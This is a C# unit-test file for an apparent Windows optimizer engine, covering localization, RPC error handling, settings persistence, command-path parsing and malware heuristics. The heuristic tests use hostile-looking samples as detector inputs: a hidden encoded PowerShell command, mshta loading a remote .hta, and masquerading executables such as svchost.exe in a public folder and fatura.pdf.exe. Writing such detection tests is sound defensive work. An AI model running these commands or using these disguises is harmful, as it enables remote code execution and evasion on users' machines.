using System.Text.Json;
using OptiCore.Engine.Core;
using OptiCore.Engine.Modules;
using OptiCore.Engine.Platform;

namespace OptiCore.Tests;

public class LocalizationTests
{
    [Fact]
    public void LText_formats_numbers_per_language()
    {
        var text = Loc.T("%{0:0.0} kullanımda", "{0:0.0}% in use").F(12.5);
        Assert.Equal("%12,5 kullanımda", text.Tr);
        Assert.Equal("12.5% in use", text.En);
    }

    [Fact]
    public void LText_serializes_to_one_language_over_rpc_and_both_on_disk()
    {
        var value = new { t = Loc.T("Merhaba", "Hello") };
        Loc.Current = "en";
        Assert.Equal("{\"t\":\"Hello\"}", JsonSerializer.Serialize(value, Json.Rpc));
        Loc.Current = "tr";
        Assert.Equal("{\"t\":\"Merhaba\"}", JsonSerializer.Serialize(value, Json.Rpc));
        var stored = JsonSerializer.Serialize(value, Json.StoreLine);
        Assert.Contains("\"tr\":\"Merhaba\"", stored);
        Assert.Contains("\"en\":\"Hello\"", stored);
        var back = JsonSerializer.Deserialize<Holder>(stored, Json.StoreLine)!;
        Assert.Equal("Hello", back.T.En);
    }

    public sealed class Holder { public LText T { get; set; } }

    [Theory]
    [InlineData(0, "0 B")]
    [InlineData(1536, "1.50 KB")]
    [InlineData(10L * 1024 * 1024 * 1024, "10.0 GB")]
    [InlineData(250L * 1024 * 1024, "250 MB")]
    public void ByteSize_picks_unit_and_precision(long bytes, string expected) => Assert.Equal(expected, new ByteSize(bytes).ToString());

    [Fact]
    public void NaN_is_written_as_zero() => Assert.Equal("{\"v\":0}", JsonSerializer.Serialize(new { v = double.NaN }, Json.Rpc));
}

public class RpcTests
{
    [Fact]
    public async Task Unknown_method_returns_not_found()
    {
        var rpc = new RpcRouter();
        var json = await rpc.HandleAsync("{\"id\":7,\"method\":\"nope\",\"params\":{}}");
        using var doc = JsonDocument.Parse(json);
        Assert.False(doc.RootElement.GetProperty("ok").GetBoolean());
        Assert.Equal(7, doc.RootElement.GetProperty("id").GetInt32());
        Assert.Equal("NOT_FOUND", doc.RootElement.GetProperty("error").GetProperty("code").GetString());
    }

    [Fact]
    public async Task Language_of_the_request_flows_into_the_handler()
    {
        var rpc = new RpcRouter();
        rpc.On("hello", _ => Loc.T("Merhaba", "Hello"));
        var en = await rpc.HandleAsync("{\"id\":1,\"method\":\"hello\",\"lang\":\"en\"}");
        var tr = await rpc.HandleAsync("{\"id\":2,\"method\":\"hello\",\"lang\":\"tr\"}");
        Assert.Contains("\"Hello\"", en);
        Assert.Contains("\"Merhaba\"", tr);
    }

    [Fact]
    public async Task Errors_are_mapped_to_codes()
    {
        var rpc = new RpcRouter();
        rpc.On("bad", c => c.Str("missing"));
        rpc.On("boom", _ => throw new InvalidOperationException("kaboom"));
        Assert.Contains("\"INVALID\"", await rpc.HandleAsync("{\"id\":1,\"method\":\"bad\",\"params\":{}}"));
        Assert.Contains("\"FAILED\"", await rpc.HandleAsync("{\"id\":1,\"method\":\"boom\",\"params\":{}}"));
    }

    [Fact]
    public void Context_reads_typed_parameters()
    {
        using var doc = JsonDocument.Parse("{\"n\":3.6,\"b\":true,\"s\":\"x\",\"a\":[\"p\",\"q\"],\"i\":[1,2]}");
        var c = new RpcContext(doc.RootElement);
        Assert.Equal(4, c.Int("n"));
        Assert.True(c.Bool("b"));
        Assert.Equal("x", c.Str("s"));
        Assert.Equal(["p", "q"], c.StrArr("a"));
        Assert.Equal([1, 2], c.IntArr("i"));
        Assert.Equal("fallback", c.Str("none", "fallback"));
        Assert.False(c.Bool("none"));
    }
}

public class SettingsTests
{
    [Fact]
    public void Patch_merges_nested_objects_and_persists()
    {
        string dir = Path.Combine(Path.GetTempPath(), "oc-test-" + Guid.NewGuid().ToString("N"));
        try
        {
            var store = new DataStore(dir);
            var settings = new SettingsService(store);
            using var doc = JsonDocument.Parse("{\"theme\":\"light\",\"alerts\":{\"cpuSeconds\":300}}");
            settings.Patch(doc.RootElement);
            Assert.Equal("light", settings.Current.Theme);
            Assert.Equal(300, settings.Current.Alerts.CpuSeconds);
            Assert.True(settings.Current.Alerts.LeakDetection); // untouched sibling survives the merge
            var reloaded = new SettingsService(new DataStore(dir));
            Assert.Equal(300, reloaded.Current.Alerts.CpuSeconds);
        }
        finally { Directory.Delete(dir, true); }
    }
}

public class PathTests
{
    [Fact]
    public void Executable_is_extracted_from_quoted_commands() =>
        Assert.Equal(@"C:\Program Files\App\app.exe", Paths.ExeFromCommand("\"C:\\Program Files\\App\\app.exe\" --background"));

    [Fact]
    public void Executable_is_found_in_unquoted_commands_with_spaces()
    {
        string notepad = Path.Combine(Environment.SystemDirectory, "notepad.exe");
        Assert.Equal(notepad, Paths.ExeFromCommand(notepad + " /A file.txt"), ignoreCase: true);
    }

    [Fact]
    public void Environment_variables_are_expanded() =>
        Assert.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.Windows), Paths.ExeFromCommand(@"%SystemRoot%\system32\ctfmon.exe")!, StringComparison.OrdinalIgnoreCase);
}

public class HeuristicTests
{
    [Fact]
    public void Encoded_powershell_is_flagged() =>
        Assert.NotEmpty(Heuristics.Flags("powershell.exe -w hidden -enc SQBFAFgA", null));

    [Fact]
    public void Script_host_downloading_from_internet_is_flagged() =>
        Assert.NotEmpty(Heuristics.Flags("mshta.exe https://example.invalid/x.hta", null));

    [Fact]
    public void Program_in_temp_folder_is_flagged() =>
        Assert.NotEmpty(Heuristics.Flags(null, Path.Combine(Path.GetTempPath(), "updater.exe")));

    [Fact]
    public void Windows_name_outside_windows_folder_is_flagged() =>
        Assert.NotEmpty(Heuristics.Flags(null, @"C:\Users\Public\svchost.exe"));

    [Fact]
    public void Double_extension_is_flagged() =>
        Assert.NotEmpty(Heuristics.Flags(null, @"D:\Mail\fatura.pdf.exe"));

    [Fact]
    public void Normal_program_is_not_flagged() =>
        Assert.Empty(Heuristics.Flags("\"C:\\Program Files\\Steam\\steam.exe\" -silent", @"C:\Program Files\Steam\steam.exe"));
}
